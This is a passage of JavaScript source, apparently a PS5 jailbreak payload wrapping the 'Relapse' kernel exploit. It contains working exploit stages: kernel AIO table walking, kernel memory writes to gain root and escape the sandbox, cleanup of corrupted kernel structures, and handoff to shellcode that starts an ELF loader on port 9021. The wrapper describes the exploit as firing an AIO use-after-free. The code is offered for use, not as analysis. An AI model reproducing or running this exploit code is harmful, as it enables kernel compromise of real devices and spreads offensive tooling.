      await this.report("Privileges", "dynlib pointer is invalid");
    }

    const uidAfter = await this.sysInt(SYS_GETUID);
    const sandboxAfter = await this.sysInt(SYS_IS_IN_SANDBOX);
    const ok = uidAfter === 0 && sandboxAfter === 0;
    if (!ok) await this.report("Privileges", "uid or sandbox check failed");
    return ok;
  }

  async lookupAioGroup(table, id) {
    const { pages, slotStride, entryType } = this.off.aio.idTable;
    const index = id & 0x1fff;

    const pageCount = await this.kread32(table.add32(pages));
    if (pageCount.rv !== 0 || pageCount.value === 0 || pageCount.value > 64)
      return null;
    if (index >= pageCount.value << 7)
      return null;

    const page = await this.readKernelPointer(table.add32((index >>> 7) * 8));
    if (!page) return null;

    const slot = page.add32((id & 0x7f) * slotStride);
    const generation = await this.kread32(slot.add32(0x28));
    if (generation.rv !== 0) return null;
    if (((((generation.value & 0xffff) << 13) | index) & 0xffff) !== id)
      return null;

    const state = await this.kread32(slot.add32(0x24)); // free_next | state<<16
    if (state.rv !== 0 || state.value >>> 16 !== 3) return null;

    const type = await this.kread32(slot.add32(0x20));
    if (type.rv !== 0 || (type.value & 0xffff) !== entryType)
      return null;

    return this.readKernelPointer(slot.add32(0x10));
  }

  async defuseAioGroups() {
    if (!this.curproc) {
      await this.report("cleanup", "current process is missing");
      return false;
    }

    const table = (await this.kread64(this.curproc.add32(this.off.proc.aioInfo))).value;
    if (!this.isKernelPointer(table)) {
      await this.report("cleanup", "aio table pointer is invalid");
      return false;
    }

    const { num, state, waiters } = this.off.aio.group;
    let total = 0,
      alreadyClear = 0,
      cleared = 0,
      skipped = 0,
      failed = 0;

    for (const ids of this.armedGroups) {
      for (const id of ids) {
        if (SWEEP_DELAY_MS > 0) await sleep(SWEEP_DELAY_MS);
        total++;
        const group = await this.lookupAioGroup(table, id);
        if (!group) {
          skipped++;
          continue;
        }

        const shared = await this.readKernelPointer(group.add32(0x10));
        if (!shared) {
          skipped++;
          continue;
        }

        const groupNum = await this.kread32(shared.add32(num));
        const groupState = await this.kread32(shared.add32(state));
        if (groupNum.value !== 1 || groupState.value < 1 || groupState.value > 4) {
          skipped++;
          continue;
        }

        const head = await this.kread64(shared.add32(waiters));
        if (head.value.low === 0 && head.value.hi === 0) {
          alreadyClear++;
          continue;
        }

        let ok = false;
        for (let attempt = 0; attempt < 3 && !ok; attempt++) {
          await this.kwrite32(shared.add32(waiters), 0);
          await this.kwrite32(shared.add32(waiters + 4), 0);
          const back = await this.kread64(shared.add32(waiters));
          ok = back.value.low === 0 && back.value.hi === 0;
        }
        if (ok) cleared++;
        else failed++;
      }
    }

    const ok = skipped === 0 && failed === 0 && cleared + alreadyClear === total;
    this.defused = true;
    if (!ok)
      await this.report("cleanup", `aio cleanup failed (${skipped} skipped, ${failed} failed)`);
    return ok;
  }

  // The kernel r/w handle. Upstream built this inline and handed it straight to
  // kexp; here it is named so the caller can hold on to it too.
  buildKrw() {
    return {
      ktextBase: this.kbase,
      procFdAddr: this.procFdAddr,
      read8: (address) => this.readKernel64(address),
      write4: (address, value) => this.writeKernel32(address, value),
      write8: (address, value) => this.writeKernel64(address, value),
    };
  }

  // shellcode
  async launchShellcode() {
    await this.restoreThreadAttributes();

    const krw = this.buildKrw();
    const loaded = await this.launchKexp({ krw });

    if (!loaded) await this.report("kexp", "payloads did not load");
    return !!loaded;
  }

  // restore
  async restoreOids() {
    if (!this.crossed) return;

    const { a, b, c, originalKind } = this.off.oid;

    for (const oid of [a, b, c])
      await this.writeKernel64(this.kaddr(oid.arg1), this.kaddr(oid.arg1Value));
    for (const oid of [a, b, c])
      await this.writeKernel32(this.kaddr(oid.kind), originalKind);
    await this.writeKernel32(this.kaddr(b.visible), 0);
    await this.writeKernel32(this.kaddr(a.deadSink), 0);
    await this.writeKernel32(this.kaddr(this.off.walkCounter.addr), 0);

    this.mibC = null;

    const cpus = await this.sysctlReadInt(this.mibA);
    const stillVisible = (await this.oidKind(this.mibB)) !== null;
    const ok = cpus.rv === 0 && !stillVisible;
    if (!ok) await this.report("Cleanup", "oid restore check failed");
  }

  async restorePipes() {
    if (!this.crossed) return;
    this.crossed = false;

    const { buffer } = this.off.pipe;

    if ((await this.aimVictim(this.master.pipe, 0, this.pipeSize)) !== 0) {
      await this.report("Cleanup", "could not aim the victim at the master, leaving both armed");
      return;
    }

    const zeroed = this.alloc(0x20);
    const written = await this.sysInt(SYS_WRITE, this.victim.writeFd, zeroed, 0x18);
    const readBack = await this.sysInt(SYS_READ, this.victim.readFd, this.drainBuffer, 0x18);
    const nulled = written === 0x18 && readBack === 0x18 &&
      this.readU32(this.drainBuffer, buffer) === 0 && this.readU32(this.drainBuffer, buffer + 4) === 0;

    if (!nulled) await this.report("Cleanup", "pipe buffer was not cleared");
  }

  async releaseAioWorkers() {
    if (!this.workerPark) return;

    try {
      await this.sysInt(SYS_CLOSE, this.workerPark.writeFd);
      await sleep(120);
      await this.sysInt(SYS_CLOSE, this.workerPark.readFd);
    } catch {
      await this.report("Cleanup", "could not release aio workers");
    }
  }

  async closeScratchDescriptors() {
    const keep = [this.master, this.victim].filter(Boolean);

    for (const fd of new Set(this.fds)) {
      if (keep.some((pipe) => pipe.readFd === fd || pipe.writeFd === fd)) continue;
      await this.sysInt(SYS_CLOSE, fd);
    }
  }

  async run() {
    await this.report("Kernel", "Starting kernel exploit");

    try {
      // Find the kernel base and keep the race on one core.
      await this.leakKernelBase();
      await this.report("Kernel", "base 0x" + this.kbase.toString());
      await this.pinToSingleCore();

      // Use the AIO/oid path to establish the first kernel read and write.
      if (!(await this.armKernelReadWrite()))
        return await this.stop("armings did not complete");
      await this.report("Kernel", "read and write ready");

      // Find our process, then switch to the faster pipe-backed path.
      if (!(await this.findCurrentProcess()))
        return await this.stop("curproc not found");
      if (!(await this.locatePipes())) return await this.stop("pipes not located");
      if (!(await this.crossPipes()))
        return await this.stop("fast read and write not established");
      await this.report("Kernel", "fast read and write ready");

      // Clear the armed AIO groups before changing privileges.
      await this.report("Kernel", "checking aio groups");
      await this.defuseAioGroups();

      await this.report("Kernel", "checking privileges");
      if (!(await this.escalate()))
        return await this.stop("escalation did not clear");
      await this.report("Kernel", "privileges ready");

      // Hand kernel access to kexp for payload loading.
      const payloads = await this.launchShellcode();
      await this.report("Kernel", payloads ? "payloads loaded" : "finished");
      return { kbase: this.kbase, done: true, payloads };
    } catch (e) {
      await this.report("Kernel", String((e && e.message) || e));
      throw e;
    } finally {
      // Restore temporary state even when a stage fails.
      await this.rescue();
    }
  }

  async stop(why) {
    await this.report("Kernel", "stopped: " + why);
    return { kbase: this.kbase, done: true, payloads: false };
  }

  async rescue() {
    try {
      if (this.pinnedCore !== undefined && !this.threadAttributesRestored)
        await this.restoreThreadAttributes();

      if (this.armedGroups.length && !this.defused) {
        await this.report("Cleanup", "repairing aio groups");
        if (!this.curproc) await this.findCurrentProcess();
        if (this.curproc) await this.defuseAioGroups();
        else await this.report("Cleanup", "current process unavailable");
      }

      await this.restoreOids();
      await this.restorePipes();
      await this.releaseAioWorkers();
      await this.closeScratchDescriptors();
    } catch {
      await this.report("Cleanup", "failed");
    }
  }
}

// ======================= PORT BOUNDARY: upstream ends here ====================

// Cleanup disarms the crossed-pipe primitive; disable accessors before publishing it.
function disarmKrw(handle) {
  const refuse = (op) => () => {
    throw new Error(
      `api.krw.${op}() is disabled: Relapse's kernel access rides the crossed pipe ` +
      `pair that the exploit's own cleanup disarms before it returns, so the ` +
      `handle only ever worked inside that one run. Re-run payloads/relapse.js ` +
      `and do the kernel work from there.`);
  };
  handle.read8 = refuse("read8");
  handle.write4 = refuse("write4");
  handle.write8 = refuse("write8");
  return handle;
}

return async function (api) {
  if (api.krw) {
    // Refuse an existing handle rather than re-arm the exploit.
    await api.log(
      "this session already holds a krw handle, so the kernel has already been hit. " +
      "Relapse fires an AIO use-after-free and re-running it on the same kernel is " +
      "how a working jailbreak turns into a panic, so it will not run twice here.",
      "warn");
    await api.log(
      "to run again: clear the handle from this session with " +
      "`return async function (api) { api.krw = null; }`, or reload the page " +
      "(installer app, or Settings -> User's Guide) for a clean one.", "info");
    return;
  }

  if (typeof api.launchKexp !== "function") {
    await api.log(
      "api.launchKexp is missing. This loader build predates the relapse payload: " +
      "re-cache the loader (installer, or reload the User's Guide) and send it again.",
      "error");
    return;
  }

  const args = api.args || [];

  const stage = args.find((a) => a === "map" || a === "pipes" || a === "spawn") || "spawn";

  if (typeof api.prefetchKexp !== "function") {
    await api.log(
      "api.prefetchKexp is missing. This loader build predates the relapse payload: " +
      "re-cache the loader (installer, or reload the User's Guide) and send it again.",
      "error");
    return;
  }

  await api.log(`Relapse kernel exploit on fw ${api.fw}`, "info");
  await api.log(`elfldr stage: ${stage}`, "info");

  // Prefetch binaries before starting the exploit.
  try {
    await api.prefetchKexp();
  } catch (e) {
    await api.log(
      `could not fetch the elfldr/kexp binaries: ${e && e.message ? e.message : e}. ` +
      `Check that host.py is still serving and the PS5 DNS still points at this PC.`,
      "error");
    return;
  }

  // Await the log flush before the exploit starts.
  await api.log("starting", "success");

  // Capture the kernel handle at the shellcode launch hook.
  let krw = null;
  const launchKexp = async (options) => {
    krw = options.krw;
    return await api.launchKexp({ ...options, stopAfter: stage });
  };

  let result;
  try {
    result = await runKernelExploit(api.p, api.chain, api.log, launchKexp);
  } catch (e) {
    await api.log(`the exploit threw: ${e && e.message ? e.message : e}`, "error");
    return;
  }

  // done also covers early stops; payloads indicates that launchShellcode was reached.
  if (!result || !result.payloads) {
    await api.log(
      result && result.done
        ? "the exploit stopped before kernel r/w was established"
        : "the exploit did not finish", "error");
    return;
  }

  // Reaching here means escalate() passed its own getuid/is_in_sandbox check, and
  // launchShellcode() got a truthy result back from api.launchKexp().
  await api.log(`kernel base 0x${result.kbase.toString(16)}`, "success");
  await api.log("elfldr is listening on port 9021", "success");

  if (!krw || !krw.procFdAddr) {
    await api.log("no procFdAddr, so there is no krw handle to publish", "warn");
    return;
  }

  api.krw = disarmKrw(krw);
  await api.log(
    `api.krw published (ktextBase 0x${krw.ktextBase.toString(16)}) -- ` +
    `read8/write4/write8 are DISABLED, see the header of this file`, "warn");
};
